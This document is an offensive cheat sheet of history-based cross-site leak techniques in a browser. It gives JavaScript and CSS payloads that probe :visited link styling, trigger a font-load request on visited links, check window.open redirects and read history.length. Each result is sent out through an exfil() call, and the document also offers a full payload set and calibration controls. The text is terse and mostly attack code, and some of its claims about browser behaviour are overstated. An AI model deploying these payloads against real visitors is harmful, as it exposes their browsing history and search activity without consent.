# History oracles — the :visited and navigation channels

Every history-based XS-leak oracle — the read, the partition, the limit.

---

## 1. The :visited oracle — a history read

```js
var a=document.createElement('a');
a.href='https://t/search?q='+encodeURIComponent(g);
a.id='v'; document.body.appendChild(a);
// a :visited style on #v differs from an unvisited one
```

```text
a link to a URL the victim visited styles :visited differently —
a 404 URL never enters history — 'is it styled visited' = 'was it
visited' = a history oracle.
```

## 2. The :visited partition — the same-site limit

```text
modern browsers partition :visited per top-frame site — a link to
a URL the victim visited on ANOTHER site doesn't style visited —
the history read is a same-site or a render-side-channel only.
```

## 3. The render-side-channel — the :visited read-back

```css
/* a :visited selector triggers a font load on a visited link */
a:visited{font-family:visited}
@font-face{font-family:visited;src:url('/leak/visited')}
/* the font loads only when the link is visited — the request IS
   the :visited read */
```

```text
the :visited channel is a RENDER-side-channel — a repaint cost or
a font-load trigger on a :visited selector — not a computed-style
query. the font load IS the history read.
```

## 4. The window.open oracle — a navigation check

```js
var w=window.open('https://t/x?q='+encodeURIComponent(g));
setTimeout(()=>exfil('open='+(w&&!w.closed)),2000);
```

```text
did the navigation happen — a redirect check — a page that redirects
on a hit vs stays on a miss — the window's state is the bit.
```

## 5. The history.length oracle — a navigation count

```js
exfil('history='+window.history.length);
```

```text
window.history.length is readable cross-origin — 'how many entries'
= 'how many navigations happened' — a count oracle.
```

## 6. The history.back/forward oracle — a navigation state

```js
// a navigation the bot's page caused — 'did the back-stack grow'
```

```text
a navigation's side-effect on the history stack — a count/state
oracle.
```

## 7. The per-oracle bandwidth — the bits-per-load

```text
a :visited oracle        — 1 bit — a visited/unvisited
a window.open oracle     — 1 bit — a navigated/not
a history.length oracle  — log2(N) bits — a count
a history.back/forward   — ~1 bit — a state
```

## 8. The per-oracle partition — the same-site limit

```text
a :visited oracle        — partitioned — same-site / a render channel
a window.open oracle     — no partition — the navigation check is readable
a history.length oracle  — no partition — the count is readable
a history.back/forward   — no partition — the state is readable
```

## 9. The :visited-oracle payload set — the complete enumeration

```js
// a link's :visited style — a render-side-channel read
var a=document.createElement('a');
a.href='https://t/search?q='+g; document.body.appendChild(a);
// a :visited-triggered font load — the font request IS the read
```

```css
/* a :visited-triggered font load */
a:visited{font-family:v}
@font-face{font-family:v;src:url('/leak/visited')}
```

```js
// a window.open — a navigation check
var w=window.open('https://t/x?q='+g);
setTimeout(()=>exfil('open='+(w&&!w.closed)),2000);

// a history.length — a navigation count
exfil('history='+window.history.length);
```

## 10. The history-oracle falsifier — when it doesn't apply

```text
a partitioned :visited on a cross-site case → the same-site limit —
the history read is dead → a different channel (a count, a status,
a CSS, a server-state).
```

## 11. The navigation-state oracle — a redirect's read

```text
a page that redirects on a hit vs stays on a miss — the window.open
oracle's 'did it navigate' IS the bit — a redirect check.
```

## 12. The history-oracle calibration — the control pair

```js
// a visited control — a URL the bot definitely visited
var a=document.createElement('a');
a.href='https://t/known-visited'; document.body.appendChild(a);
// an unvisited control — a URL the bot definitely didn't visit
var b=document.createElement('a');
b.href='https://t/never-visited-'+Math.random(); document.body.appendChild(b);
```

```text
a visited-vs-unvisited control pair — the :visited channel's
discrimination — 'is it styled visited' separates 'visited' from
'unvisited' from 'a broken channel'.
```
